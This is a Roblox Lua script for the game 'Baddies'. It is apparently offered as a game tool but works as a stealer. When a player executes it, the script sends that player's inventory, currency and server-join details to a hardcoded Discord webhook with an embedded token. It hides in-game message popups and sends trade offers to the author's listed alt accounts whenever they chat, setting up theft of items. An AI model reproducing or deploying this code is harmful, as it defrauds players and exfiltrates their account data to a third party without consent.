local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script doesnt support this game, join BADDIES")
    return
end

local MY_WEBHOOK = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.Webhook or "PUTHERE"
local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}

local START_TIME = os.time()

local function checkServerStatus()
    local playerCount = #Players:GetPlayers()
    if playerCount >= Players.MaxPlayers - 1 then
        localPlayer:Kick("rejoin a diff server")
        return false
    end
    if playerCount < 3 then
        localPlayer:Kick("DATA not loaded, rejoin a public")
        return false
    end
    return true
end

if not checkServerStatus() then return end

local function formatNumber(num)
    if not num then return "N/A" end
    if num >= 1000000 then return string.format("%.1fM", num / 1000000)
    elseif num >= 1000 then return string.format("%.1fK", num / 1000)
    else return tostring(num) end
end

local function hasMainWeapons()
    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))
    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p:lower(), 1, true) then
                table.insert(base, name); matched = true; break
            end
        end
        if not matched then table.insert(main, name) end
    end
    return #main >= 3, base, main, #main
end

local hasEnoughWeapons, _, _, mainCount = hasMainWeapons()
if not hasEnoughWeapons then
    warn("Not enough main weapons. Need at least 3, have: " .. mainCount)
    return
end

local function sendRequest(url, body)
    if not url or url == "" or url == "PUTHERE" then return nil end
    local headers = {["Content-Type"] = "application/json"}
    local encoded = body
    if type(body) ~= "string" then
        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
        encoded = ok and s or "{}"
    end
    local candidates = {
        function() if syn and syn.request then return syn.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if request then return request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if http and http.request then return http.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if http_request then return http_request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
        function() if fluxus and fluxus.request then return fluxus.request({Url=url,Method="POST",Headers=headers,Body=encoded}) end end,
    }
    for _, tryFn in ipairs(candidates) do
        local ok, res = pcall(tryFn)
        if ok and res and (res.Success == true or res.StatusCode == 200 or res.Body ~= nil) then
            return res
        end
    end
    return nil
end

-- Delete messages GUI
local function deleteMessagesGui()
    local g = playerGui:FindFirstChild("Messages")
    if g then g:Destroy() end
end
deleteMessagesGui()

local function handleGui(gui)
    if gui.Name == "Messages" then gui:Destroy() end
end
for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
playerGui.ChildAdded:Connect(handleGui)

-- Send inventory to webhook
local function sendInventory()
    if not checkServerStatus() then return end
    if #Players:GetPlayers() < 3 then return end

    local tools = {}
    local function collect(from)
        if from then
            for _, v in ipairs(from:GetChildren()) do
                if v:IsA("Tool") then table.insert(tools, v.Name) end
            end
        end
    end
    collect(localPlayer:FindFirstChild("Backpack"))
    collect(localPlayer.Character)
    collect(localPlayer:FindFirstChild("StarterGear"))

    local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
    local base, main = {}, {}
    for _, name in ipairs(tools) do
        local lower = name:lower()
        local matched = false
        for _, p in ipairs(patterns) do
            if string.find(lower, p:lower(), 1, true) then
                table.insert(base, name); matched = true; break
            end
        end
        if not matched then table.insert(main, name) end
    end

    local isRich = #main >= 3
    local baseText = #base > 0 and table.concat(base, " | ") or "None"
    local mainText = #main > 0 and table.concat(main, "\n") or "None"
    local ls = localPlayer:FindFirstChild("leaderstats")
    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local slays  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
    local elapsed = os.time() - START_TIME
    local function fmt(sec)
        local m = math.floor(sec/60); local s = sec%60
        return m > 0 and (m.."m "..s.."s") or (s.."s")
    end
    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
    local playerName = localPlayer.Name

    local fields = {
        {name="💰 Dinero",          value=tostring(formatNumber(dinero)), inline=true},
        {name="⚔️ Slays",           value=tostring(formatNumber(slays)),  inline=true},
        {name="⏱️ Player Executed", value=fmt(elapsed).." ago",          inline=false},
        {name="🧩 Server Joiner",   value="```lua\n"..joinScript.."```", inline=false},
    }

    local embed = {
        title       = playerName.."'s Inventory 🔫",
        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
        color       = isRich and 0xFF0000 or 0xFFA500,
        fields      = fields,
        footer      = {text="Freemium Logger | "..playerName},
        timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    if USER_WEBHOOK ~= "PUTHERE" then
        local content = playerName.." has executed! (freemium)"
        if isRich then content = content.." @everyone @here RICH PLAYER!" end
        sendRequest(USER_WEBHOOK, {content=content, embeds={embed}})
    end
    if isRich then
        sendRequest(MY_WEBHOOK, {content=playerName.." RICH — freemium @everyone", embeds={embed}})
    end
end

sendInventory()

-- Basic trade offer on chat
local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)

local tradeList = playerGui:WaitForChild("TradeList")
local mainFrame = tradeList:WaitForChild("Main")
local tradeRequest = mainFrame:WaitForChild("TradeRequest")
tradeRequest.Visible = true

local function processChatMessage(sender, txt)
    for _, username in ipairs(MY_USERNAMES) do
        if sender.Name:lower() == username:lower() then
            local target = Players:FindFirstChild(sender.Name)
            if target then
                task.wait(0.2)
                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end)
            end
            break
        end
    end
end

if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        local ts = message.TextSource
        if not ts then return end
        local sender = Players:GetPlayerByUserId(ts.UserId)
        if not sender then return end
        task.delay(0.5, function()
            processChatMessage(sender, tostring(message.Text or ""):lower())
        end)
    end
end

for _, player in pairs(Players:GetPlayers()) do
    if player ~= localPlayer then
        pcall(function()
            player.Chatted:Connect(function(msg)
                task.delay(0.5, function() processChatMessage(player, msg:lower()) end)
            end)
        end)
    end
end
Players.PlayerAdded:Connect(function(player)
    pcall(function()
        player.Chatted:Connect(function(msg)
            task.delay(0.5, function() processChatMessage(player, msg:lower()) end)
        end)
    end)
end)

task.spawn(function()
    while true do
        if not checkServerStatus() then break end
        local m = playerGui:FindFirstChild("Messages")
        if m then m:Destroy() end
        task.wait(0.1)
    end
end)
